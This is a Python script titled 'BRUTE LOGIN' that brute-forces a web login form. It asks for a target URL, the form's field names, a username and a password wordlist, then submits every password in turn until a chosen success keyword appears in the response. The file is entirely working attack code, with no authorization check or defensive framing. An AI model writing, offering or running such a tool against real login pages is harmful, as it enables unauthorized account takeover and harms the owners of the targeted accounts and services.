import requests
from tqdm import tqdm

# BRUTE LOGIN
# Author: AMAZ0NAS

def bruteforce_login():
    print("---------------------------")
    print("|      BRUTE LOGIN        |")
    print("---------------------------\n")
    
    url = input("Enter the login URL: ").strip()
    if not url.startswith(('http://', 'https://')):
        print("[!] URL must start with http:// or https://")
        return

    user_field = input("Enter the username field name: ").strip()
    pass_field = input("Enter the password field name: ").strip()
    username = input("Enter the username to test: ").strip()
    wordlist_path = input("Enter the path to the wordlist: ").strip()
    success_indicator = input("Enter a keyword that indicates a successful login: ").strip()

    if not all([url, user_field, pass_field, username, wordlist_path, success_indicator]):
        print("[!] All fields are required!")
        return

    try:
        with open(wordlist_path, "r") as file:
            wordlist = file.read().splitlines()
            if not wordlist:
                print("[!] Wordlist is empty!")
                return
    except FileNotFoundError:
        print("[!] Wordlist not found!")
        return
    except Exception as e:
        print(f"[!] Error reading wordlist: {e}")
        return

    print(f"\n[+] Starting brute force attack on {url} with username '{username}'...")
    
    session = requests.Session()
    found = False

    for password in tqdm(wordlist, desc="Testing passwords"):
        data = {user_field: username, pass_field: password}
        try:
            response = session.post(url, data=data, timeout=10)
            if success_indicator in response.text:
                print(f"\n[✓] Password found: {password}")
                found = True
                break
        except requests.RequestException as e:
            print(f"\n[!] Error with password '{password}': {e}")
            continue

    if not found:
        print("\n[×] No valid password found in the wordlist.")

if __name__ == "__main__":
    bruteforce_login()